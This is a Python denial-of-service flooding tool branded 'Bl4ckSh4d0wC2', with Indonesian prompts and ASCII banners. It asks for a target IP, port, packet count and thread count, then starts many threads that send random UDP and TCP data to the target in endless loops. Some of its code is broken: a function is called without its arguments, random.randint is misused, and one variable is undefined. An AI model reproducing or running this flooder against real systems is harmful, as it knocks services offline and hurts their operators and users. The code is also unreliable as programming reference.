# Bl4ckSh4d0wC2
###################################################################################
import os, sys, time, threading, socket, random
from time import time as tt
###################################################################################
def clear():
	os.system('cls' if os.name=='nt' else 'clear')

def running(s):
	try:
		for c in s + '\n':
        	    sys.stdout.write(c)
	            sys.stdout.flush()
	            time.sleep(0.001)
	except (KeyboardInterrupt,EOFError):
		run('Error!!')

def stoped():
	print("\033[94m╔═════════╗")
	print("\033[94m║\033[91m-STOPPED \033[94m║")
	print("\033[94m╚═════════╝")
	print("\033[94m╔═════════════════════════════╗")
	print("\033[94m║ \033[91mKAYANYA LAGI MT NIH WKWKW!? \033[94m║")
	print("\033[94m╚═════════════════════════════╝")
	print("\033[94m[ ク ]  -  ATTACKED TO IP \033[0m{}\033[94m AND PORT \033[0m{}\033[94mHASS BEEN STOPPED".format(ip, port))

def bsc2():
	clear()
	running("b╔═══════════════════════════════════════╗")
	running("b║m  ╔══╗╔╗──────╔╗─╔═══╦╗──────╔╗")
	running("b║m  ║╔╗║║║──────║║─║╔═╗║║──────║║")
	running("b║m  ║╚╝╚╣║╔══╦══╣║╔╣╚══╣╚═╦══╦═╝╠══╦╗╔╗╔╗")
	running("b║m  ║╔═╗║║║╔╗║╔═╣╚╝╩══╗║╔╗║╔╗║╔╗║╔╗║╚╝╚╝║")
	running("b║m  ║╚═╝║╚╣╔╗║╚═╣╔╗╣╚═╝║║║║╔╗║╚╝║╚╝╠╗╔╗╔╝")
	running("b║m  ╚═══╩═╩╝╚╩══╩╝╚╩═══╩╝╚╩╝╚╩══╩══╝╚╝╚╝")
	running("b╚═══════╦════════════════════════╦══════╝")
	running("b╔═══════╩═══════════╦════════════╩══════╗")
	running("b║mBl4ckSh4d0wC2                   b║mBsComeback                         b║ ")
	running("b╚═══════════════════╩═══════════════════╝")

def attacking():
    clear()
    print("\033[94m╔═════════════════════════════════════════════════════════╗")
    print("\033[94m║\033[91m           ╔═══╗╔╗─╔╗──────╔╗──╔═══╗─────╔╗              \033[94m║")
    print("\033[94m║\033[91m           ║╔═╗╠╝╚╦╝╚╗─────║║──║╔═╗║────╔╝╚╗             \033[94m║")
    print("\033[94m║\033[91m           ║║─║╠╗╔╩╗╔╬══╦══╣║╔╗║╚══╦══╦═╬╗╔╝             \033[94m║")
    print("\033[94m║\033[91m           ║╚═╝║║║─║║║╔╗║╔═╣╚╝╝╚══╗║║═╣╔╗╣║              \033[94m║")
    print("\033[94m║\033[91m           ║╔═╗║║╚╗║╚╣╔╗║╚═╣╔╗╗║╚═╝║║═╣║║║╚╗             \033[94m║")
    print("\033[94m║\033[91m           ╚╝─╚╝╚═╝╚═╩╝╚╩══╩╝╚╝╚═══╩══╩╝╚╩═╝             \033[94m║")
    print("\033[94m╚═══════╦══════════════════════════════════════════╦══════╝")
    print("\033[94m╔═══════╩════════════════════╦═════════════════════╩══════╗")
    print("\033[94m║ \033[91mBimzzxTheNextGenerations.  \033[94m║ \033[91mToolsBuildAt : 17/05/22.   \033[94m║")
    print("\033[94m╚════════════════════════════╩════════════════════════════╝")
###################################################################################
powerran = (random.randint(30,100))
sys.stdout.write("[+] Bl4ckSh4d0wC2 | Api Connected [1] | Backup Server [2] | Online User [1] | Admin: [Bl4ckSh4d0w] | POWER : {}% [UNSTABLE]".format(powerran))
os.system('cls' if os.name=='nt' else 'clear')
ip = str(input("\033[94m╔═══\033[91m[ Masukkan IP-nya ] •\n\033[94m╠══>\033[0m "))
port = int(input("\033[94m╠═══\033[91m[ Masukkan PORT-nya ] •\n\033[94m╠══>\033[0m "))
time = int(input("\033[94m╠═══\033[91m[ Masukkan PACKETs-nya ] •\n\033[94m╠══>\033[0m "))
size = int(input("\033[94m╠═══\033[91m[ Masukkan THREADs-nya ] •\n\033[94m╠══>\033[0m "))
###################################################################################
# \033[94m[ ク ]  -  ATTACK SENT TO IP \033[91m{ip}\033[94m AND PORT \033[91m{port}

def attack(ip, port, time, size):
    if time is None:
        time = float('inf')
    if port is not None:
        port = max(1, min(65535, port))
    attacking()
    fmt = ''.format(ip=ip, port='port {port}'.format(port=port) if port else 'random ports')
    print(fmt)
    startup = tt()
    size = os.urandom(min(666, size))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        port = port or random.randint(1,666, 65535, 3354, 7777, 8888)
        endtime = tt()
        if (startup + time) < endtime:
            break
        sock.sendto(size, (ip, port))

def run1():
	data = random._urandom(1024)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(time):
				s.sendto(data,addr)
		except:
			s.close()

# Noh mampus with TCP
def run2():
	data = random._urandom(1025)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
		except:
			s.close()

def run3():
	data = random._urandom(1800)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(time):
				s.sendto(data,addr)
		except:
			s.close()

def run4():
	data = random._urandom(818)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(time):
				s.sendto(data,addr)
		except:
			s.close()

def run5():
	data = random._urandom(999)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(time):
				s.sendto(data,addr)
		except:
			s.close()

def attack2():
	for x in range(size):
		th = threading.Thread(target = run1)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()

def attack3():
	for i in range(size):
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()

if __name__ == '__main__':
    try:
        attack()
        attack2()
        attack3()
    except KeyboardInterrupt:
        stoped()
        clear()